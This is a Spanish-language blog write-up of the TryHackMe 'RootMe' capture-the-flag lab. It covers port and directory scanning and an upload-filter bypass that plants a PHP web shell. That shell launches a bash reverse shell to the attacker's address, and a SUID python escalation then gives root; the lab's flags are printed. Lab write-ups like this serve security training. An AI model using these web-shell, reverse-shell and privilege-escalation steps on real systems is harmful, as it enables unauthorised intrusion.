---
layout: single
title: RootMe - TryHackMe
excerpt: " A ctf for beginners, can you root me? "
date: 2022-09-25
classes: wide
header:
  teaser: /blog/assets/images/thm-writeup-rootme/rootme.png
  teaser_home_page: true
  icon: /blog/assets/images/tryhackme.webp
categories:
  - tryhackme
tags:  
  - php
  - python
  - suid
---

A ctf for beginners, can you _root me_?

# Summary
- IP: 10.10.233.124
- Ports: 22,80
- OS: Linux (Ubuntu)
- Services & Applications:
	-  22 -> OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
	-  80 -> Apache httpd 2.4.29

# Recon

- Escaneo básico de puertos:

```bash
$sudo nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.10.233.124 -oG allPorts
```

- Escaneo profundo de puertos abiertos encontrados:
``` bash
$sudo nmap -p22,80 -sCV 10.10.233.124 -oN targeted
```

- Búsqueda de directorios web con gobuster:
```bash
$gobuster dir -u http://10.10.233.124/ -w /usr/share/SecLists/Discovery/Web-Content/common.txt
```

- Encontramos un directorio llamado /panel/ el cual nos permite subir archivos; intentamos hacer una reverse shell con un archivo PHP pero no admite subir archivos .php; al parecer solo filtra archivos php, por lo que subimos un archivo "backdoor.php5" con una linea que nos permite ejecutar mediante el link el parámetro "cmd":

``` bash
<?php echo passthru($_GET["cmd"]); ?> 
```

- Ya subido el archivo, lo abrimos desde el directorio "/uploads" y ya podremos ejecutar comandos desde el link con el parámetro "cmd", aquí entablamos una reverse shell básica:

``` 
http://10.10.233.124/uploads/backdoor.php5?cmd=bash -c "bash -i >%26 /dev/tcp/10.18.101.123/443 0>%261"
```


- Accedemos a la máquina como usuario ww-data, hacemos tratamiento de la tty:
```bash
ww-data$script /dev/null -c bash
CTRL+Z
$stty raw -echo;fg
$reset xterm
$export TERM=xterm
$export SHELL=bash
```

- Encontramos la flag de usuario:

# USER FLAG: THM{y0u_g0t_a_sh3ll}

# ESCALANDO PRIVILEGIOS:

-  Escalación de privilegios; buscamos archivos con permisos SUID:
```bash
find / -perm -4000 2>/dev/null | grep -v snap
```

- Vemos que el binario "python" cuenta con permisos SUID, buscamos en GTFOBINS alguna forma de escalar privilegios con esta información, y encontramos que ejecutando el binario python de la siguiente forma sirve para realizar la escalación de privilegios:
```bash
./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

- Encontramos la flag de root:

# ROOT FLAG: THM{pr1v1l3g3_3sc4l4t10n}
